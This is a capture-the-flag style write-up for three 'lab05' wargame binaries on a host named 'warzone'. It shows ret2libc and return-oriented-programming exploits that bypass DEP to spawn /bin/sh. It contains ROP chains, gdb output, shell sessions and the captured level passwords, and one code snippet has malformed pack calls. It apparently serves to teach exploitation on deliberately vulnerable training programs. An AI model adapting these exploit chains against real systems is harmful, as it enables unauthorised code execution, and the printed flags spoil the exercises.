## lab5C

It's a straightforward challenge. We can overflow the buffer with a call to the function ```gets```. The stack has ```data execution prevention```, so injecting code will be useless. We will use ```return oriented programming``` to circumvent this.

We use ```ret2libc``` to make a call to ```system()```, with a pointer to the string ```"/bin/sh"``` as its argument. Let's not forget to put a dummy ```ret``` address before the argument.

```bash
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7e63190 <__libc_system>

gdb-peda$ searchmem "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xb7f83a24 ("/bin/sh")
```
```bash
lab5C@warzone:/levels/lab05$ python /tmp/dir/expl5C.py 
I included libc for you...
Can you ROP to system()?
cat ~lab5B/.pass
s0m3tim3s_r3t2libC_1s_3n0ugh
```
## lab5B

Another straightforward challenge. It is specified directly in the source code that we need to inject a ```ROP chain```.

Using the command ```ROPgadget --binary "/levels/lab05/lab5B" --ropchain``` we generated a ropchain.
We simply overflowed the buffer and saved base pointer and inserted our chain next.

```python
# Padding goes here
p = ''

p += pack('<I', 0x0806ec5a) # pop edx ; ret
p += pack('<I', 0x080eb060) # @ .data
p += pack('<I', 0x080bbf26) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0809a95d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ec5a) # pop edx ; ret
p += pack('<I', 0x080eb064) # @ .data + 4
p += pack('<I', 0x080bbf26) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0809a95d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ec5a) # pop edx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x080544e0) # xor eax, eax ; ret
p += pack('<I', 0x0809a95d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080eb060) # @ .data
p += pack('<I', 0x080e55ad) # pop ecx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x0806ec5a) # pop edx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x080544e0) # xor eax, eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x08049401) # int 0x80
```

```bash
lab5B@warzone:/levels/lab05$ python /tmp/dir/expl5B.py 
Insert ROP chain here:
cat ~lab5A/.pass
th4ts_th3_r0p_i_lik3_2_s33
```

## lab5A

This challenge is similar to the one we had in ```lab3A```. It's another crappy number storage service, but with more security!
As we had last time, we have 3 options:
* ```store``` - stores a number into the data storage
* ```read``` - read a number from the data storage
* ```quit``` - exist the program

Looking at the ```store_number``` function, we can see that it has the same constraint - we cannot store at indexes which fulfill this condition: ```index % 3 == 0```. However, now it checks whether our index value that we inputted exceeds the storage size. However, we can still modify the stack at a lower address that that of the array by storing at a negative index.

Unlike the last time, we cannot insert a shellcode because of ```DEP```. We also cannot modify the``` main```'s ```ret``` pointer, since it is at an index we cannot reach.
To circumvent these problems, we can use ```return oriented programming``` and construct a chain of ```gadgets``` to mimic a shellcode. Since ```store_number```'s ret function is in a lower address, we can modify it by using a negative index. However we will have to ```stack pivot``` to our ```ropchain```.

* ```asm 0xbffff438 - data[0] ```
* ```asm 0xbffff40c - RET of store function ```

Therefore RET is at index (0xbffff40c - 0xbffff438) / 4 = ```-11```
Alright, now we simply have to pivot ```44 bytes``` into a higher address. Using ```ROPgadget``` we find that there does exactly that:

```asm
0x08049bb7 : add esp, 0x2c ; ret
```

Perfect, now all there's left to do is to construct our ```ropchain```. We will start by using ```ROPgadget``` to generate for us one, however this will not be its final version since this ropchain will not work with the way things are on the stack.


These first few lines will construct a "/bin//sh" string somewhere in the memory.

```python
    p += pack('0x0806f3aa) # pop edx ; ret
    p += pack('0x080eb060) # @ .data
    p += pack('0x080bc4d6) # pop eax ; ret
    p += '/bin'
    p += pack('0x080a2ccd) # mov dword ptr [edx], eax ; ret
    p += pack('0x0806f3aa) # pop edx ; ret
    p += pack('0x080eb064) # @ .data + 4
    p += pack('0x080bc4d6) # pop eax ; ret
    p += '//sh'
    p += pack('0x080a2ccd) # mov dword ptr [edx], eax ; ret
    p += pack('0x0806f3aa) # pop edx ; ret
    p += pack('0x080eb068) # @ .data + 8
    p += pack('0x08054c30) # xor eax, eax ; ret
    p += pack('0x080a2ccd) # mov dword ptr [edx], eax ; ret
```

As you can see, there are several ```pop``` instructions. Unlike the last time where we had our shellcode, we can't really separate our ropchain and pivot easily, because calling a ```pop``` instruction will take what the value of ```esp``` and puts it in our register, ```adds 4 to esp``` and ```returns``` immediately, basically returning to a ```% 3 == 0``` index, which we cannot access. Therefore, our ropchain will break down.

To do this, after ```popping```, we have to immediately ```add 4 to esp``` to avoid returning into an invalid index. This will apply to both edx and eax, since those are the registers which conduct the writing of the string in memory:

```python
p += pack('0x080a2ccd) # mov dword ptr [edx], eax ; ret
```

We have to look again in ```ROPgadgets``` to find suitable gadgets to get around this. In order to ```add 4 to our esp```, I decided to simply use another ```pop``` instruction to jump over the invalid index. So we have to find ```a gadget with 2 pops followed immediately by a return```.

I couldn't find one for eax, but I did find one for edx:

```python
chain.append(str(0x0806f3a9)) # pop ebx ; pop edx ; ret
```

However, we can see that it is the second ```pop```, not the first one. Therefore we will put a ```NOP gadget``` right before this one. This way, ```pop ebx``` will take over the ```invalid index``` and ```pop edx``` will take whatever it is at ```index % 3 == 1```. To continue our shellcode, we will make a ```4 byte jump``` immediately after.

```python
chain.append(str(0x0809ffdf)) # nop ; ret                      
chain.append(str(0x0806f3a9)) # pop ebx ; pop edx ; ret                
chain.append(str(0x6e69622f))   
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret 
```

Perfect, now we can set any value in ```edx```. What about ```eax``` though? Well I couldn't find a ```gadget``` with two ```pops```, one of them being ```eax```. I did find an ```xchg eax, edx``` (of all registers!).

Well, now here will be the final plan then. We will add into ```edx``` a pointer to our string, exchange with ```eax``` so now ```eax``` will have the address and then set ```edx``` to the address in memory where we will store it. Then, we will perform the memory overwrite. Yeah, I know, it sounds confusing.

Here is an example for the first part of the string. Hopefully the comments and new lines will make it more clear:

```python
# /bin
chain.append(str(0x0809ffdf)) # nop ; ret                      
chain.append(str(0x0806f3a9)) # pop ebx ; pop edx ; ret                
chain.append(str(0x6e69622f)) # /bin
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret                   

chain.append(str(0x080aa04c)) # xchg eax, edx ; ret                
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret                   

chain.append(str(0x0809ffdf)) # nop ; ret                          
chain.append(str(0x0806f3a9)) # pop ebx ; pop edx ; ret            
chain.append(str(0x080eb060)) # @ .data                            
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret                   

chain.append(str(0x080a2ccd)) # mov dword ptr [edx], eax ; ret
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret
```

We will perform this for the second part of the string, too - //sh.
For the NULL character at the end we will set edx to ```.data + 8``` and ```eax``` to ```0``` (```xor eax, eax```).

Now we have to set the ```arguments```. I first started with ```ecx```. It has to be set to NULL.

```python
# Setting ecx
chain.append(str(0x0806f3d1)) # pop ecx ; pop ebx ; ret
chain.append(str(0x080eb068)) # @ .data + 8
```

Now we have to set ```ebx``` as a pointer to our string and ```edx``` to zero. We can do this at the same time.

```python
# Setting ebx and edx
chain.append(str(0x0806f3a9)) # pop ebx ; pop edx ; ret
chain.append(str(0x080eb060)) # @ .data
```

```edx``` will become zero because it will ```pop``` an invalid index which has the value zero.

Now we have to set ```eax``` to 11. We can do a bunch of increments as our generated ```ropchain``` did, but I saw that there was a ```gadget``` which sets ```eax``` to 12. Luckly, there was another ```gadget``` that ```decrementes``` it. Sweet! After that we can put the ```int 0x80``` call.

```python
# set eax with the syscall nr
chain.append(str(0x08054c30)) # xor eax, eax ; ret
chain.append(str(0x0806c0a9)) # add esp, 4 ; ret

chain.append(str(0x0809ffdf)) # nop ; ret
chain.append(str(0x08096f06)) # mov eax, 0xc ; pop edi ; ret

chain.append(str(0x080648d3)) # dec eax ; ret
chain.append(str(0x08048eaa)) # int 0x80
```

So basically, throughout making this ropchain I need to find gadgets that where basically

```asm pop eXx ; pop anything ; ret```

for ```eax```, ```ebx```, ```ecx```, ```edx``` or, if I couldn't find, ways to go around this.


Notes:
- unsigned numbers don't care about little endian
- don't forget that ret instruction increments esp with 4

```bash
lab5A@warzone:/levels/lab05$ (python /tmp/lab5A.py; cat -) | ./lab5A
----------------------------------------------------
  Welcome to doom's crappy number storage service!
          Version 2.0 - With more security!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   doom has reserved some storage for himself :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:

cat ~lab5end/.pass
byp4ss1ng_d3p_1s_c00l_am1rite
```
